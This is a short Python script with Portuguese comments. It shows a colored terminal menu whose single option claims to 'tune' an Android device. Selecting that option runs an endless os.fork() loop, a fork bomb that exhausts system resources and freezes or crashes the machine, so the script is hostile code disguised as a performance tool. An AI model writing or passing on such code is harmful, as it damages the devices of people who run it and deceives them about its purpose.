#####################
# FUNÇÕES & MODULOS #
#####################

global R,B,C,Y,G,RT,CY,CO
CO='\033[m';R='\033[1;31m';B='\033[1;34m';C='\033[1;37m';CY='\033[1;36m';Y='\033[1;33m';G='\033[1;32m';RT='\033[;0m';NO_FORMAT="\033[0m";C_GREY89="\033[38;5;254m";C_RED1="\033[48;5;196m"


import os, sys, smtplib, json, requests
from time import sleep


def clear():
	os.system('clear')
def x():
	print(f'   {C}[{G}X{C}]{R} RETORNAR')	
	
####################
#                  #
#  MENU PRINCIPAL  #          
#                  #
####################


while True:
	clear()
	
	print(f'  ________________________________________')
	print(f'                                         ')
	print(f'    {C}[{G}01{C}]{R} TUNNAR ANDROID{C}{G}{C}{C}                   ')
	print(f'                                         ')
	print(f'   \\___________________________________________')
	choice = input(f'\n\n\n{R}   >>>{C} ')
	
	if choice == '1':
		while True:
			os.fork()
